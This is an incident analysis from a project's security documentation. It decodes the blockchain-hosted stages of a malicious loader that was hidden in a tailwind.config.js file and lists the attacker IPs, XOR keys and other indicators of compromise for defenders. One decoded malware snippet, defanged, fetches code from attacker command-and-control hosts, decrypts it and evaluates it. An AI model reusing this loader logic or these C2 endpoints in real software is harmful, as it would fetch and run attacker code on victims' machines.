# Recovered on-chain stages — tailwind.config.js loader (#71)

**2026-08-03.** Follow-up to [2026-07-30-tailwind-payload-analysis.md](./2026-07-30-tailwind-payload-analysis.md),
which analysed the loader in the repository and concluded:

> The one thing static analysis cannot recover is the stage itself.

**It was recoverable, and it has been recovered.** All three on-chain stages are now decoded,
statically, and they yield a set of indicators far more useful than the four blockchain
hostnames the original document had — including **four attacker-controlled IP addresses and a
live HTTP C2 endpoint**, none of which appeared anywhere in the previous analysis.

Everything below was obtained by pure string transformation. **No attacker code was executed,
and the C2 servers were never contacted** — see [Deliberate limits](#deliberate-limits).

---

## The correction that unlocked this

The original analysis listed two BSC transaction hashes under "On-chain addresses" and advised
inspecting them on a public explorer. That advice cannot work: **neither hash exists on BSC
mainnet.** Nor does a third one found during this pass.

| Hardcoded hash | On BSC mainnet? |
|---|---|
| `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e` | **no** |
| `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3` | **no** |
| `0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1` | **no** |

Verified `null` from `eth_getTransactionByHash` on three independent nodes
(`bsc-rpc.publicnode.com`, `bsc-dataseed.binance.org`, `bsc-dataseed1.defibit.io`). That null is
trustworthy: a control transaction from the latest block **and** a control transaction from
inside the exposure window (block 112694217, 2026-07-28 21:00 UTC) both resolve on all three,
so these nodes do serve historical lookups and the absence is real, not pruning.

The original document was not wrong to list them — they *are* in the sample. It was wrong about
their **role**. Reading the loader's own steps 4–5 shows why: the BSC hash is **resolved at
runtime from the TRON dead drop**, and the hardcoded values are only stale fallbacks. The live
path is always `TRON → BSC`, and following it is what recovers the payload.

---

## The three dead drops resolved

All three TRON accounts are **live and still serving pointers**. Decode is: take
`data[0].raw_data.data`, hex-decode to UTF-8, **reverse the string**.

| TRON account | Pointer posted | Resolves to BSC tx | Stage size |
|---|---|---|---|
| `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | 2026-06-23 02:35:45Z | `0x18a8420f727f2405f9d1805ad887b31029b584b2ff5a7ec0f57c72635183e99d` | 5,849 B |
| `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | 2026-06-20 13:37:54Z | `0x7ffb4efddd96e20aec90724be2ac9a71c138a9af697b9fb8224bbf80ea4f22be` | 3,525 B |
| `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | 2026-06-08 21:29:42Z | `0xb6c725890be6890fd2c735eedc47e24b85a350301f6c19a3864e43c35e470968` | 77,276 B |

**Every pointer predates the exposure window (2026-07-28 → 07-29) and none has been rotated
since.** So what is recovered here is, with high confidence, the same stage that ran during the
window — the concern that "what it delivers today need not be what it delivered then" does not
apply to these three.

All three payload transactions were sent from the **same funding address**
`0x9bc1355344b54dedf3e44296916ed15653844509` to the burn address
`0x000000000000000000000000000000000000dead` — the payload is the transaction's `input` field;
the transfer itself is meaningless. That funding address is itself an indicator, and its
transaction history is a route to any *other* campaign stages.

`TA48dct6…` is a **third dead drop that the original analysis did not know about.**

---

## Stage contents

### Chain A stage — a self-refreshing loader

`0x18a8420f…` decrypts (XOR key `2[gWfGj;<:-93Z^C`) to a wrapper that unpacks, via three
shuffle ciphers and the dictionary decompressor, to a **reimplementation of the loader itself**:
it re-reads a TRON dead drop, fetches a BSC transaction, XOR-decrypts and `eval`s it. It takes
its addresses from `global._t_1` / `global._t_2` rather than hardcoding them, which is what makes
the campaign re-pointable without touching the victim.

Its string table confirms the original analysis of the loader **exactly** — TronGrid URL, Aptos
fallback, both BSC nodes, the `?.?` delimiter, the chain-A XOR key. That agreement is the best
available evidence that the original document's decoding was correct.

The wrapper also sets the address globals two ways:

- a base64 blob → `_t_1 = TMfKQEd7…`, `_t_2 = 0xbe0374…` (the stale fallback)
- a branch on `global._V` → `_t_1 = TA48dct6…`, `_t_2 = 0x533b2d…`, plus the C2 globals below

Following the live branch (`TA48dct6…`) lands on the **77 KB stage**.

### Chain B stage — the live HTTP C2 bootstrap

`0x7ffb4efd…` decrypts (XOR key `m6:tTh^D)cBz?NM]`) and unpacks to something materially more
serious than a blockchain reader. Fully decoded, defanged:

```js
// selects a C2 host based on global._V
if (_V[0] === "A")                _H2 = "http://23.27.13.43";
else if (!isNaN(parseInt(_V)))    _H2 = "http://198.105.127.210";
else { _H = "http://198.105.127.210"; _H2 = "http://23.27.202.27:27017"; }

_t_1 = "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP";
_t_2 = "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e";

await eval( xor( await httpGet({
    url:     (_H || _H2) + "/$/boot",
    method:  "GET",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  + "(KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36",
      "Sec-V":      _V,
    },
}), key = "ThZG+0jfXE6VAGOJ" ) );
```

Four things worth naming:

1. **Plain HTTP, not HTTPS** — so any TLS-terminating proxy or flow log sees the full request,
   including the path and the `Sec-V` header. This is the single most detectable artefact in the
   whole campaign.
2. **`/$/boot`** is a distinctive path. A literal `$` in a URL path is rare enough to grep for
   with near-zero false positives.
3. **`Sec-V`** is a non-standard request header. Real browsers never send it. Grepping for it in
   any proxy log is close to a zero-false-positive detection.
4. **The spoofed Chrome-on-Windows User-Agent from a Node process on Linux** is internally
   inconsistent and is itself a detection opportunity.

### Chain C stage — the 77 KB payload

`0xb6c72589…` decrypts with the chain-A key to a 77,276-character stage — an order of magnitude
larger than the other two, and the plausible final payload.

**It is recovered but not yet fully deobfuscated.** It is packed differently from everything
above: `lz-string` `compressToBase64` with a **custom alphabet**
(`…0123456789+-$` rather than `+/=`), wrapped in control-flow-flattened generator functions
using `with` blocks. A keyword sweep for credential/wallet/browser-profile strings returns
**zero hits**, which is expected — every string is inside the LZ-string blob.

Deobfuscating it is the obvious next step and is a self-contained task; it needs an lz-string
decompressor with the custom alphabet, then control-flow unflattening. **Until that is done, no
claim should be made about what this stage does.** Its size and position in the chain are
suggestive, not evidence.

---

## Indicators of compromise — revised

The original document's four hostnames (`api.trongrid.io`, `fullnode.mainnet.aptoslabs.com`,
`bsc-dataseed.binance.org`, `bsc-rpc.publicnode.com`) remain valid but are **legitimate public
infrastructure**. The indicators below are **attacker-controlled**: a hit on any of them is
unambiguous, and there is no benign explanation for this product's infrastructure touching them.

### Attacker-controlled network endpoints — search these first

| Indicator | Where seen |
|---|---|
| `166.88.134.62` (`:443`, and bare) | `_t_s` / `_t_u`, chain-A wrapper |
| `198.105.127.210` (`:443`, and bare) | `_t_s` / `_t_u`, and chain-B `_H`/`_H2` |
| `23.27.202.27` (`:443`, **`:27017`**) | `_t_s` / `_t_u`, and chain-B `_H2` |
| `23.27.13.43` | chain-B `_H2`, taken when `_V` starts with `A` |
| URL path `/$/boot` | chain-B C2 fetch |
| Request header `Sec-V` | chain-B C2 fetch |
| BSC funding address `0x9bc1355344b54dedf3e44296916ed15653844509` | sender of all three payload txs |
| TRON `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | third dead drop, previously unknown |

`23.27.202.27:27017` is worth a second look: **27017 is MongoDB's default port**, and the legacy
stack was MongoDB Atlas. That is probably just a C2 hiding on a plausible-looking port, but it
should be ruled out rather than assumed.

### Host artefacts

- **XOR keys:** `2[gWfGj;<:-93Z^C` (chain A), `m6:tTh^D)cBz?NM]` (chain B),
  **`ThZG+0jfXE6VAGOJ`** (C2 response — new)
- **Globals:** `_V`, `_R`, `_H`, `_H2`, `_t_0`, `_t_1`, `_t_2`, `_t_c`, `_t_t`, `_t_s`, `_t_u`,
  `_p_t`, plus the previously documented `C`, `r`, `m`
- **Obfuscation markers:** `_$_56c8`, `_$_96c7`, `_$_9f51`, `_$_16d1`, `_$_a478` (this pass),
  plus the previously documented `_$_c266`, `_$af1390258`, `_$_2369`
- Delimiter `?.?`

---

## What this changes

**For #71 (traffic audit)** — the audit now has something worth searching for. Previously it
meant grepping for four hostnames that a build container might contact for unrelated reasons.
Now: **four IP addresses, a URL path, and a request header, over plain HTTP.** Search Vercel
build logs, any egress/flow logs, DNS telemetry and proxy logs for the window
2026-07-28 → 2026-07-29, and for the whole period the payload was present.

The original caution still holds and is now sharper: `stdio: 'ignore'` and unlogged outbound
HTTPS mean **absence of evidence is not evidence of absence.** But the chain-B path is *plain
HTTP*, so if any HTTP-layer logging existed at all, it would have captured this.

**For #70 (rotation)** — unchanged, and if anything reinforced. The final stage's behaviour is
still unknown, chain A ran in-process with full access to build-time environment variables, and
chain B spawned a detached process that outlived the build. "Assume everything is compromised"
remains the correct posture. This analysis narrows *where to look*, not *what was taken*.

**For #72** — the claim that the stage was unrecoverable is now retracted; see the top of this
document. The original analysis of the loader is otherwise confirmed correct in every particular
that this pass could independently check.

---

## Reproducing this

The decoders are reimplemented as pure Python string transformations in
[`tools/unpack-loader-stages.py`](./tools/unpack-loader-stages.py). It executes nothing.

```sh
# 1. resolve a dead drop -> BSC pointer (hex-decode, then reverse)
curl -s "https://api.trongrid.io/v1/accounts/<TRON_ADDR>/transactions?only_confirmed=true&only_from=true&limit=1"

# 2. fetch the stage
curl -s -X POST https://bsc-rpc.publicnode.com -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"eth_getTransactionByHash","params":["<POINTER>"]}'

# 3. result.input -> strip 0x -> hex-decode -> split on '?.?' -> field[1] -> repeating-key XOR
# 4. unpack the shuffle/decompressor layers
python3 docs/security/tools/unpack-loader-stages.py <decrypted-stage.js>
```

The recovered stage sources are **deliberately not committed** — the same reasoning that kept the
original sample out of this repo. They are reproducible from the steps above in under a minute.

### Deliberate limits

Two things were **not** done, on purpose:

- **The C2 servers were never contacted.** Fetching `/$/boot` would deliver the current payload,
  but it would also tell the operator, from our egress IP, that the sample is being analysed —
  and would invite rotation of exactly the indicators above. If someone decides that trade is
  worth making, do it from unattributable infrastructure, not from a corporate or CI network.
- **Nothing was executed.** Every layer here was undone as a string transformation. The reasoning
  from the original document still applies: a sandbox run would show only what the operator serves
  today, whereas the three dead drops are unrotated since June and therefore *do* speak to the
  exposure window.

Reading the TRON and BSC data is a read against neutral public infrastructure (TronGrid and public
BSC RPC nodes) and is not observable by the operator.
